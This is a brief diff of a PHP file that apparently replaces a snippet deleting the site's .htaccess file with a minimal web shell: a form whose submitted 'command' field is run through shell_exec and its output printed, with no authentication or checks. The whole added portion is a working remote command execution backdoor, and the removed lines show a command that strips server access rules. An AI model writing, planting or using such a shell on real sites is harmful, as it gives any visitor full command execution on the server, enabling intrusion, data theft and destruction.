@@ -1,6 +1,11 @@
 <?php
-    
-    system('rm .htaccess');
-    echo shell_exec('dir');
-
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+  $command = $_POST["command"];
+  $output = shell_exec($command);
+  echo "<pre>$output</pre>";
+}
 ?>
+<form method="post">
+  <input type="text" name="command">
+  <input type="submit" value="Execute">
+</form>
